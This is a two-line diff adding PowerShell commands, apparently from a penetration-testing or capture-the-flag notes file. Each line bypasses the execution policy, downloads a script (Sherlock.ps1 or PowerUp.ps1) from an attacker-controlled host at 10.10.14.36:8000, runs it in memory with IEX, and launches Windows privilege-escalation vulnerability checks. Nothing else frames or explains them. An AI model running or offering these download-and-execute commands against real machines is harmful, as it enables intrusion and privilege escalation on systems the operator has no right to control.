@@ -1,0 +1,2 @@
+powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.36:8000/Sherlock.ps1');Find-AllVulns"
+powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.36:8000/PowerUp.ps1');Invoke-AllChecks"
